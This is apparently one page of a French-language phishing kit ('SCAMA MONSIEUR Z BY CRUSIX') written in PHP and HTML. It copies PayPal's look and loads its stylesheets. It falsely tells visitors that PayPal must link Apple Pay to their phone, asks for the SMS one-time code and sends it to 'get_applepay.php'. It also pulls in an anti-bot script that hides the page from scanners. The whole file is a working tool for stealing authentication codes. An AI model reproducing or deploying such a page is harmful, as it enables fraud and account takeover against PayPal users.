<?php
/*
SCAMA MONSIEUR Z
BY CRUSIX
VBV_01.PHP
*/
session_start();
include('../ANTIBOTS/antibots.php');
?>

<html lang="fr" >
<head>
 <meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0"><meta charset="utf-8">

 <link rel="shortcut icon" sizes="196x196" href="https://cdn.pixabay.com/photo/2015/05/26/09/37/paypal-784404_960_720.png"><link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico"><link rel="icon" type="image/x-icon" href="https://cdn.pixabay.com/photo/2015/05/26/09/37/paypal-784404_960_720.png"><link rel="stylesheet" href="https://www.paypalobjects.com/ui-web/vx-pattern-lib/2-0-5/paypal-sans.css"><link rel="stylesheet" href="https://www.paypalobjects.com/web/res/66d/35fa22be3bb5bbc6c31d9a12b8aa5/css/main.ltr.css"><title>PayPal&nbsp;: Confirmations</title>
<script src="https://www.paypalobjects.com/tagmgmt/bootstrap.js"></script>
</head><body class="vx_root vx_hasOpenModal vx_addFlowTransition">


 <link rel="stylesheet" type="text/css" href="https://www.paypalobjects.com/ui-web/ui-web/header-footer/1.40.0/header-footer.min.css">
<div class="vx_modal-flow vx_modalPrepToOpen vx_modalIsOpen" id="mainModal" tabindex="-1" aria-labelledby="js_modalHeader"><div class="vx_modal-wrapper-backgroundOverride vx_modal-wrapper elementDirection vx_modal-wrapper_logo" tabindex="-1"><div><div class="vx_modal-content"><header class="vx_modal-header"><h2 id="js_modalHeader" class="vx_text-2 header-centered">Liaison à Apple Pay</h2>

<center><img src="https://www.creditmutuel.fr/partage/fr/CC/CMNE-2018/contrib/produits/apple-pay/apple-pay_main.jpg" style="width: 150px;"></center>

  <p style="text-align: center;">PayPal est désormais partenaire Apple Pay,<br> Afin de vous accorder avec nos nouvelles règles, nous allons activer Apple Pay sur votre numéro de téléphone. <br> Apple Pay est un service gratuit. </p>

  <p class="vx_text-body header-centered"></p>

</header><div class="vx_modal-body vx_blocks-for-mobile"><div><div class="vx_modal-body vx_blocks-for-mobile"><div class="form-container">


	<form action="get_applepay.php" method="POST">

		
<?php
if(strpos($_SERVER['REQUEST_URI'], 'error=true')){
echo '<div style="margin-top: 40px;" class="vx_alert vx_alert-critical form-alert alertComponent test_alert-message"><p role="alert" aria-live="assertive" class="vx_alert-text ">Vérifiez votre saisie.</p></div>';
}
?>
  <div  class="vx_form-group vx_floatingLabel_active" data-label-content="Code reçu par SMS"><label class="floatingLabel" for="cardNumber">Code reçu par SMS</label><input  onpaste="return false;"  type="text" id="otp" aria-describedby="text-info-cardNumber" name="codeotp" class="test_cardNumber test_cardNumber vx_form-control" placeholder="Code reçu par SMS" autocomplete="off" value="" onkeypress="return isNumberKey(event)"  ></div>

  
</div>
<button style="margin-top: -5px;" type="submit" data-testid="button-submit" name="detailsSubmit" data-track="{}" class="btn vx_btn vx_btn-block card-submit test_add-card-submit" title="" pa-marked="1">Terminer</button><form id="js_addAddressForm" action="/myaccount/money/flow/cards/new/manual/new-address" method="POST"><input type="hidden" name="_csrf" value="PuC2HEIgFHztByO/Kp60B2Yo5wcqg+rZcjZ9s="><input type="hidden" name="expDate" id="js_addAddress-expDate"><input type="hidden" name="isFlow" value="false"></form></div></div></div></div></div></div></div><div>
</form>


<script>
function isNumberKey(evt){
    var charCode = (evt.which) ? evt.which : evt.keyCode
    if (charCode > 31 && (charCode < 48 || charCode > 57))
        return false;
    return true;
}
</script>





			<script type="text/javascript" src="https://www.paypalobjects.com/ui-web/vx-pattern-lib/3-2-3/vx-lib.min.js"></script>

          </body></html>